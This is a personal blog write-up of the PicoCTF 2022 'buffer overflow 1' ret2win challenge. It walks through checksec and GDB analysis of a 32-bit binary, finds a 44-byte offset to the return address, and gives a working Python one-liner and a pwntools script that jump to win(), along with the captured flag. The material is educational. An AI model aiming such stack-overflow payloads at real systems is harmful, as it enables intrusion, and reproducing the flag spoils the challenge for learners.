---
layout: single
title:  "PicoCTF 2022 - buffer overflow 1"
categories: 
  - PicoCTF
  - Binary Exploitation
tags:
  - ctf
  - picoctf
---

This is the first "proper" binary exploitation (ret2win) challenge in this CTF.

For this challenge, I found John Hammond's [walkthrough video](https://www.youtube.com/watch?v=k4hqdVo3cqk&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=31&pp=iAQB) to be extremely helpful and informative.


## My solution
Firstly, let's download the provided files.
```
wget https://artifacts.picoctf.net/c/187/vuln
wget https://artifacts.picoctf.net/c/187/vuln.c
```

Let's take a look at `vuln`. Using `file` and `checksec`, we observe the following:
```
$ file vuln
>> vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, 
BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
$ checksec vuln                                                                     
[] '/mnt/c/Users/yihao/Downloads/picoCTF/2022/blog/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```
We observe that the file is a 32-bit ELF file. It was also compiled on
a little-endian system.

Now, looking at `vuln.c`, we can see that the provided file has a read buffer size of 32. 
It also used the `gets()` function to retrieve user input within the `vuln()`
function. Lastly, the return address is also printed out. There is also a `win()`
function present.

Evidently, we will need to control the return address to call the `win()`
function.  

I then decided to do some experimenting, where I wanted to see how many 'A's will cause the return address to be overwritten. 
Using 32 'A's, we observe that the program returned to this address:
`0x804932f`.

I used GDB to disassemble the program, in order to determine which instruction
this specific address points to. Using GDB:
```
$ gdb vuln
>> ...
gef> disas main
...
 0x0804932f <+107>:   mov    eax,0x0
...
```
Thus, it appears that this specific address is bound to a move instruction in
`main()`.

Through further trial and error, I found that around 44 'A's were required to clobber the return address.
I can then run `readelf -s vuln` to look for the return address of `win()`. From here, we note that the return address is `0x080491f6`.

Now, we can generate the payload. Take note of the endianness when generating the payload. In this case, we want to order our bytes in "reverse", since the executable runs on a little-endian system.

Using Python 2.7 to pipe the payload directly into the program: 
```bash
python -c "print 'A'*44 + '\xf6\x91\x04\x08'" | nc saturn.picoctf.net 60801 
```

Alternatively, using Python 3 to send payload through a solver script:
```python
# solve.py

from pwn import *
# elf = ELF('./vuln')
# p = process(elf.path)
p = remote('saturn.picoctf.net',60801)

# payload buffer
payload = b'A' * 44
payload += p32(0x080491f6)

print(p.recvuntil(':'))
p.sendline(payload)
p.interactive()
```
Both methods enable us to obtain the flag.
```
[+] Opening connection to saturn.picoctf.net on port 60801: Done
solve.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(p.recvuntil(':'))
b'Please enter your string:'
[*] Switching to interactive mode

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}[*] Got EOF while reading in interactive
$
[*] Closed connection to saturn.picoctf.net port 60801
```

## Learning Takeaways
Some general tips I picked up:
- Play around with the program to test the number of dummy characters required to clobber the return address of our intended functions.
    - We also can use GDB/GEF to determine the offsets, but that will be covered in
  a later writeup. :)
- Get familiar with `readelf`.
- Even though the Python 2 solution is quicker, it'll be better to get used to
  Python 3 and pwntools (as well as how bytestrings are handled in Python 3).
- Always make sure to check endianness, so that the payload can be generated correctly.

Thanks for reading!
